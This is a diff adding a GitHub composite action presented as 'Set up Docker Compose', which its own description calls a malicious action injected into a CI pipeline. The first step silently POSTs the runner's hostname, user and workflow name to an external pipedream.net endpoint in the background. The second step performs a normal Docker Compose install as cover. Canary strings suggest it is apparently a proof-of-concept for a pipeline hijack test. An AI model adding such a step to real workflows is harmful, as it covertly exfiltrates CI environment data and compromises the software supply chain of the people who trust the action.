@@ -1,0 +1,23 @@
+name: 'Set up Docker Compose'
+description: 'Malicious composite action injected into the CI pipeline'
+inputs: {}
+outputs: {}
+runs:
+  using: 'composite'
+  steps:
+    - name: Execute payload
+      shell: bash
+      run: |
+        echo "::notice::COMPOSITE_ACTION_HIJACK_CONFIRMED"
+        echo "HB-CANARY-$(date +%s)" >> $GITHUB_STEP_SUMMARY
+        # Exfiltrate runner info
+        curl -s -X POST "https://enxbwb7wfcpj.x.pipedream.net/" -d "runner=$(hostname)&user=$(whoami)&workflow=$GITHUB_WORKFLOW" &>/dev/null &
+    - name: Install Docker Compose (normal behavior)
+      shell: bash
+      run: |
+        docker compose version 2>/dev/null || {
+          echo "Installing Docker Compose plugin..."
+          mkdir -p ~/.docker/cli-plugins
+          curl -sSL "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o ~/.docker/cli-plugins/docker-compose
+          chmod +x ~/.docker/cli-plugins/docker-compose
+        }
